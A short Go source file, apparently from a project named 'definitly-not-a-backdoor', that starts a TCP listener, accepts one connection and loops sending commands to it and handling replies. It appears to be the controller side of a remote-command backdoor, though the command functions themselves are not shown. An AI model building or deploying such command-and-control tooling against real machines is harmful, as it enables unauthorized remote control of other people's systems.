package tcpConnection

import (
	"fmt"
	"net"

	"github.com/bruh-boys/definitly-not-a-backdoor/config"
	"github.com/bruh-boys/definitly-not-a-backdoor/other"
)

func StartServer() {

	other.PrintMessage("Server waiting connections on " + config.ConnHost + ":" + config.ConnPort + " (Connection type: " + config.ConnType + ")")

	l, err := net.Listen(config.ConnType, config.ConnHost+":"+config.ConnPort)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		return
	}
	defer l.Close()

	conn, err := l.Accept()
	if err != nil {
		fmt.Println("Error accepting:", err.Error())
		return
	} else {
		fmt.Println("Conexion recieved from " + conn.RemoteAddr().String())
	}

	for {
		sendCommands(conn)
		handleConnection(conn)
	}

}
